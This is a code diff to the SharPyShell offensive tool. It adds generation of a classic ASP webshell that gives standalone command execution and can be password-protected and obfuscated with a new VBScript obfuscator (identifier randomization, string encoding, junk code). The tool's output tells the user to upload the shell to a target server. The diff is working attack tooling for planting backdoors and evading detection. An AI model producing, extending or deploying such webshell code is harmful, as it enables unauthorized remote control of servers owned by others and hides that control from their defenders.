@@ -2,7 +2,8 @@ from core import config
 from struct import unpack
 from itertools import cycle
 from utils.obfuscation import (
-    CSharpObfuscator, convert_aspx_to_ashx, convert_aspx_to_asmx,
+    CSharpObfuscator, VBScriptObfuscator,
+    convert_aspx_to_ashx, convert_aspx_to_asmx,
     random_class_name, random_method_name,
 )
 import hashlib
@@ -134,7 +135,29 @@ class Generate():
             self.__password, self.__file_format
         )
 
+    def __generate_asp(self):
+        template_path = self.__templates_path + 'template_raw.asp'
+        with open(template_path, 'r') as file_handle:
+            template_code = file_handle.read()
+        webshell_code = template_code.replace(
+            '{{SharPyShell_Placeholder_pwd}}', self.__password
+        )
+        if self.__obfuscate:
+            vbs_obf = VBScriptObfuscator()
+            webshell_code = vbs_obf.obfuscate(webshell_code, self.__password)
+        with open(self.__output_path, 'w') as file_handle:
+            file_handle.write(webshell_code)
+        print('SharPyShell webshell written correctly to: ' + self.__output_path)
+        fmt_note = ' (Classic ASP - standalone command execution, no module system)'
+        if self.__obfuscate:
+            fmt_note += '\nObfuscation applied: identifier randomization, string encoding, junk code'
+        print(fmt_note)
+        print('\nUpload it to the target server and let\'s start having some fun :) \n\n')
+
     def generate(self):
+        if self.__file_format == 'asp':
+            self.__generate_asp()
+            return
         template_code = self.__get_template_code()
         if self.__obfuscator == 'encrypted_dll_ulong_compression':
             webshell_code = self.__generate_webshell_code_ulong_compression(template_code)
